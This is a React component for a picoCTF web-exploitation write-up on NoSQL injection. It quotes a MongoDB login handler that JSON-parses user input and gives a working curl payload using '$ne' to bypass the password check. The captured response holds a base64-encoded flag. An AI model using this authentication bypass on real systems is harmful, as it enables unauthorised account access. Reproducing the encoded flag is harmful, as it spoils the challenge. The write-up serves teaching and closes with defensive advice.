'use client';

import WriteupTemplate from '@/components/WriteupTemplate';

export default function NoSQLInjectionWriteup() {
  const writeupData = {
    title: 'No Sql Injection',
    category: 'Web Exploitation',
    points: 'n/a',
    author: 'Kelvin Creighton',
    difficulty: 'medium' as const,
    tags: ['nosqli', 'web', 'mongodb', 'base64'],
    flag: 'picoCTF{...}',
    sections: [
      {
        title: 'Research',
        cards: [
          {
            title: 'What is NoSQL Injection?',
            items: [
              'It occurs when user input is unsafely embedded into database queries in a NoSQL database (like MongoDB).',
              'Unlike traditional SQL Injection, NoSQL injection often leverages data structures (like JSON objects) and operators (e.g., `$ne`, `$gt`).',
            ],
          },
          {
            title: 'Dangerous Patterns in Node.js/MongoDB',
            items: [
              'Using objects directly in queries: `User.find(req.body)`',
              'Using `$where` with user input.',
              'Using eval-like constructs.',
            ],
          },
        ],
      },
      {
        title: 'Information Gathering',
        prose: 'The challenge gives us access to a web application using Express, Body-Parser, and Mongoose for a MongoDB backend. The goal is to bypass the login logic and obtain the flag.',
        steps: [
          {
            number: '01',
            label: 'Analyzing `server.js`',
            prose: 'Looking at the provided source code, we identified the key components used: Express, Mongoose, and a local MongoMemoryServer instance.\n\nWe also found an initial user created: email: "picoplayer355@picoctf.org". The password is randomly generated but stored in plaintext in the DB, which is a bad practice.',
          },
          {
            number: '02',
            label: 'Identifying the Vulnerability',
            input: `const user = await User.findOne({
  email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
  password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password,
});`,
            reason: '<strong>Reason:</strong> The code attempts to parse the `email` and `password` fields as JSON if they start and end with braces. This is a severe vulnerability as it allows us to supply MongoDB query operators (like `$ne`) as the password instead of a string, leading to a NoSQL Injection.',
          },
        ],
      },
      {
        title: 'Creating the Payload',
        prose: 'Since we know the target email (`picoplayer355@picoctf.org`) and the application processes JSON inputs into MongoDB queries, we can construct a request that bypasses the password check.',
        steps: [
          {
            number: '01',
            label: 'Bypassing Authentication with `$ne`',
            input: `curl -s -X POST http://[target]/login -H 'Content-Type: application/json' -d '{"email":"picoplayer355@picoctf.org","password":"{\\"$ne\\":null}"}'`,
            output: `{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==","firstName":"pico","lastName":"player"}`,
            reason: '<strong>Reason:</strong> The payload `{\\"$ne\\":null}` translates to "not equal to null". Since every user has a password, this condition is true. The database finds the user matching the email and a non-null password, granting us access.',
          },
          {
            number: '02',
            label: 'Decoding the Token',
            prose: 'The response contains a `token` field that looks like base64. Decoding it yields the flag.',
          },
        ],
      },
      {
        title: 'Key Takeaways',
        cards: [
          {
            title: '',
            items: [
              'Never parse user input directly into query objects without strict validation or sanitization.',
              'Storing passwords in plaintext (even if randomly generated) violates basic security principles. Always use strong hashing algorithms like bcrypt.',
              'Understanding how the backend framework (like Mongoose) handles complex objects is crucial for identifying NoSQL injections.',
            ],
          },
        ],
      },
    ],
  };

  return <WriteupTemplate data={writeupData} />;
}
